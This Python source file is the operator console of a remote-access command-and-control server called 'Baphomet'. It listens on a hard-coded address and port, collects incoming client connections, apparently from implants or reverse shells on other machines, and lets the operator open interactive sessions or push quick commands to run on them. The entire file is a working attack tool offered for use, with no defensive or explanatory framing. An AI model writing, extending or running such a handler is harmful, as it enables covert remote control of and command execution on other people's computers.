import socket
import sys
import threading
import os
import time
from datetime import datetime 



start_time = datetime.now()

current_session = 'None'
total_connections = 0

list_of_clients = []
addresses = []

host = "192.168.123.208"
port = 9999

def set_console_title():
    while True:
        total_connections = len(addresses)
        time_running = datetime.now() - start_time
        title = f"Baphomet :: Current Session: {current_session} :: Connections: {total_connections} :: Time running: {str(time_running).split('.')[0]}"
        
        if sys.platform == "win32":
            os.system(f"title {title}")
        else:
            sys.stdout.write(f"\x1b]2;{title}\x07")
            sys.stdout.flush()

        time.sleep(1)  # Update every 1 seconds


title_thread = threading.Thread(target=set_console_title, daemon=True).start()





def rgb_lerp(start_color, end_color, t):
    """ Linearly interpolate between two colors """
    return [int(start_color[i] + (end_color[i] - start_color[i]) * t) for i in range(3)]

def rgb_to_ansi(rgb):
    """ Convert RGB to ANSI escape code """
    return f"\033[38;2;{rgb[0]};{rgb[1]};{rgb[2]}m"

def fade_text(text, start_color, end_color):
    lines = text.split('\n')
    faded_text = ""
    
    for i, line in enumerate(lines):
        t = i / max(1, len(lines) - 1)
        color = rgb_lerp(start_color, end_color, t)
        ansi_color = rgb_to_ansi(color)
        faded_text += ansi_color + line + "\033[0m\n"

    return faded_text

def banner():
    os.system('cls')
    banner_str = """
 /$$$$$$$                      /$$                                           /$$    
| $$__  $$                    | $$                                          | $$    
| $$  \ $$  /$$$$$$   /$$$$$$ | $$$$$$$   /$$$$$$  /$$$$$$/$$$$   /$$$$$$  /$$$$$$  
| $$$$$$$  |____  $$ /$$__  $$| $$__  $$ /$$__  $$| $$_  $$_  $$ /$$__  $$|_  $$_/  
| $$__  $$  /$$$$$$$| $$  \ $$| $$  \ $$| $$  \ $$| $$ \ $$ \ $$| $$$$$$$$  | $$    
| $$  \ $$ /$$__  $$| $$  | $$| $$  | $$| $$  | $$| $$ | $$ | $$| $$_____/  | $$ /$$
| $$$$$$$/|  $$$$$$$| $$$$$$$/| $$  | $$|  $$$$$$/| $$ | $$ | $$|  $$$$$$$  |  $$$$/
|_______/  \_______/| $$____/ |__/  |__/ \______/ |__/ |__/ |__/ \_______/   \___/  
                    | $$                                                            
                    | $$                                                            
                    |__/                                                            
    """
    # Example usage
    start_color = [255, 0, 0]       # Red
    end_color = [255, 105, 180]     # Hot pink (as an approximation of dark pink)
    print(fade_text(banner_str, start_color, end_color))
    print("\nType 'help' to show help panel, 'connect {number}' to interact, 'exit' to quit")



def create_socket():
    try:
        global host
        global port
        global server_socket
        server_socket = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

def bind_socket():
    try:
        global host
        global port
        global server_socket
        print("Binding the Port: " + str(port))
        server_socket.bind((host, port))
        server_socket.listen(5)
    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()

def reconfigure_socket(new_host, new_port):
    global host, port, server_socket, list_of_clients, addresses
    host, port = new_host, new_port
    for client in list_of_clients:
        client.close()
    server_socket.close()
    list_of_clients = []
    addresses = []

    create_socket()
    bind_socket()
    print(f"Server is now listening on {host}:{port}")

def accepting_connections():
    for c in list_of_clients:
        c.close()
    del list_of_clients[:]
    del addresses[:]

    while True:
        try:
            conn, address = server_socket.accept()
            server_socket.setblocking(1)
            list_of_clients.append(conn)
            addresses.append(address)
            print(f"\nConnection has been established: {address[0]}:{address[1]}")
        except:
            print("Error accepting connection/s")


def remove_client(conn, address):
    if conn in list_of_clients:
        list_of_clients.remove(conn)
    
    if address in addresses:
        addresses.remove(address)
    conn.close


def start_client_session(conn, address):
    global current_session
    current_session = address
    while True:
        try:
            cmd = input(f'[Session {address}]: ')
        
            if cmd.lower() in ['quit', 'exit']:
                print("Exiting session...")
                return

            if cmd != '':
                conn.send(str.encode(cmd))
                client_response = receive_full_response(conn)
                if not client_response:
                    raise ConnectionError("Client disconnected")
                print(client_response, end="\n")
        
        except (ConnectionError, OSError):
            print(f'Session {address} disconnected.')
            remove_client(conn, address)
            return
        except EOFError:
            print("Exiting session...")
            return
        


def send_quick_command(conn, cmd):
    try:
        conn.send(str.encode(cmd))
        response = receive_full_response(conn)
        print(response, end="\n")
    except socket.error as e:
        print(f"Error sending command to the client: {e}")



def help_panel():
    print("""
list                   -- List active sessions
connect {number}       -- Connect to a session
set ip {ip}            -- Sets the current ip listening on
set port {port}        -- Sets the current port listening on
qc {number} {command}  -- Sends a command to a client without fully connecting
banner                 -- clears the screen
exit/quit              -- Exit / Quit the script
          """)


def menu():
    while True:
        current_session = 'None'
        choice = input("").strip().lower()

        if choice == 'exit':
            break

        if choice in ['banner', 'cls', 'clear']:
            banner()

        if choice == 'list':
            if addresses:
                print("\nConnected Clients:")
                for idx, address in enumerate(addresses):
                    print(f"{idx + 1}: {address[0]}:{address[1]}")
            else:
                print("No clients currently connected.")
            continue

        if choice.startswith("set ip "):
            new_ip = choice.split(" ")[2]
            reconfigure_socket(new_ip, port)

        if choice.startswith("set port "):
            new_port = int(choice.split(" ")[2])
            reconfigure_socket(host, new_port)

        if choice == 'help':
            help_panel()

        if choice.startswith("connect "):
            try:
                selected_index = int(choice.split()[1]) - 1
                selected_conn = list_of_clients[selected_index]
                selected_address = addresses[selected_index]
                start_client_session(selected_conn, selected_address)
            except (ValueError, IndexError):
                print("Invalid selection, please try again.")

        if choice.startswith("qc "):
            parts = choice.split()
            if len(parts) >= 3:
                try:
                    client_index = int(parts[1]) - 1
                    cmd_to_send = " ".join(parts[2:])
                    if client_index >= 0 and client_index < len(list_of_clients):
                        send_quick_command(list_of_clients[client_index], cmd_to_send)
                    else:
                        print("Invalid client index.")
                except ValueError:
                    print("Invalid input format. Usage: qc <client_num> <command>")
                continue



def receive_full_response(conn):
    buffer_size = 4096
    data = b""
    while True:
        part = conn.recv(buffer_size)
        data += part
        if len(part) < buffer_size:
            break
    return data.decode("utf-8")



def main():
    banner()
    create_socket()
    bind_socket()
    threading.Thread(target=accepting_connections, daemon=True).start()
    menu()

main()